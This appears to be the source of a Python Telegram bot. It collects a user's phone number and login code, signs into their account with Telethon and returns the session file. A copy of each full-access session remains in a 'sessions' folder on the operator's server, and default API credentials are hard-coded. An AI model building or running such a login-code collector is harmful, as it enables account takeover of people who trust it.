import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError
import time

TOKEN = os.getenv('TOKEN')
API_ID = int(os.getenv('API_ID', '28537210'))
API_HASH = os.getenv('API_HASH', '5388b7e4bc869cce695b682f2644a160')

bot = telebot.TeleBot(TOKEN)
os.makedirs('sessions', exist_ok=True)

user_data = {}

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
    markup.add(btn)
    bot.send_message(uid, "🔑 Нажми кнопку, чтобы отправить номер", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.chat.id
    if not m.contact:
        bot.send_message(uid, "❌ Ошибка, попробуй /start")
        return
    
    phone = m.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    
    user_data[uid] = {'phone': phone}
    bot.send_message(uid, f"📲 Номер: {phone}\nОтправляю код...")
    
    # Создаём клиент синхронно
    client = TelegramClient(f'sessions/user_{uid}', API_ID, API_HASH)
    user_data[uid]['client'] = client
    
    # Подключаемся и отправляем код
    client.connect()
    try:
        client.send_code_request(phone)
        bot.send_message(uid, "✅ Код отправлен! Введите его:")
        bot.register_next_step_handler(m, get_code)
    except FloodWaitError as e:
        bot.send_message(uid, f"❌ FloodWait: жди {e.seconds} секунд")
        client.disconnect()
        del user_data[uid]
    except Exception as e:
        bot.send_message(uid, f"❌ Ошибка: {e}")
        client.disconnect()
        del user_data[uid]

def get_code(m):
    uid = m.chat.id
    code = m.text.strip()
    
    if uid not in user_data or 'client' not in user_data[uid]:
        bot.send_message(uid, "❌ Ошибка, начни заново /start")
        return
    
    client = user_data[uid]['client']
    phone = user_data[uid]['phone']
    
    try:
        client.sign_in(phone, code)
        client.disconnect()
        
        session_file = f'sessions/user_{uid}.session'
        if os.path.exists(session_file):
            with open(session_file, 'rb') as f:
                bot.send_document(uid, f, caption=f"✅ Сессия готова!\nНомер: {phone}")
        else:
            bot.send_message(uid, "❌ Файл сессии не найден")
        
        del user_data[uid]
        
    except Exception as e:
        bot.send_message(uid, f"❌ Ошибка: {e}")
        client.disconnect()
        del user_data[uid]

@bot.message_handler(commands=['cancel'])
def cancel(m):
    uid = m.chat.id
    if uid in user_data and 'client' in user_data[uid]:
        user_data[uid]['client'].disconnect()
        del user_data[uid]
    
    markup = types.ReplyKeyboardRemove()
    bot.send_message(uid, "❌ Отменено", reply_markup=markup)

print("🚀 Session Bot запущен")
bot.infinity_polling()
